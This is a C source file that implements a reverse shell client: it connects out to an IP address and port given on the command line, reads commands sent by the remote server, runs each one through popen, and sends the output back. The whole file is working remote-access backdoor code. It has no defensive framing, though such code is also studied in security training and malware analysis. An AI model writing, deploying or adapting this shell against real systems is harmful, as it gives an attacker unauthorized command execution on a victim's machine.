#include <stdio.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netinet/in.h>
#include <stdlib.h>
void execute_send(int sockfd, char *cmd) {
  FILE *fp;
  char output[4096];

  fp = popen(cmd, "r");
  if (fp == NULL) {
    char *err = "Failed to execute command!\n";
    send(sockfd, err, strlen(err), 0);
    return;
  }

  while (fgets(output, sizeof(output)-1, fp) != NULL) {
    send(sockfd, output, strlen(output), 0);
  }
   // Send delimiter to mark end of output
  char *end_marker = "<END_OF_CMD_OUTPUT>\n";
  send(sockfd, end_marker, strlen(end_marker), 0);

  pclose(fp);
}
void error(char *msg) {
  perror(msg); 
}
int main(int argc, char *argv[]) {
    if (argc < 3) {
      fprintf(stderr, "Syntax error: %s <ip_addr> <port>\n", argv[0]);
      return -1;
  }
    int PORT = atoi(argv[2]);
    char* IP = argv[1];
    int status, valread, client_fd;
    struct sockaddr_in serv_addr;
    memset (&serv_addr, 0, sizeof(serv_addr) );
    char msg[1024];
    char buffer[1024] = {0};
    if ((client_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) { // Checking when the socket is failed to create, it will return -1 (<0)
      error("Failed to create socket\n"); 
      return -1;
  }
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);
    if (inet_pton(AF_INET, IP, &serv_addr.sin_addr) <= 0) {
      error("Failed to initialize the server\n");
  }
    if ((status = connect(client_fd, (struct sockaddr *)&serv_addr, sizeof(serv_addr))) < 0) {
    error("Connection Failed Miserably!\n");
  }
  while (1) {
    valread = read(client_fd, buffer, sizeof(buffer) - 1);
    if (valread <= 0) {
      printf("Connection has been closed!\n");
      break;
    }
    buffer[valread] = '\0';
    printf("Command from server: %s\n",buffer);

    if (strcmp(buffer, "quit") == 0) {
      printf("Exiting...\n");
      break;
    }

    execute_send(client_fd, buffer);
    
  }
  close(client_fd);
  return 0;

}
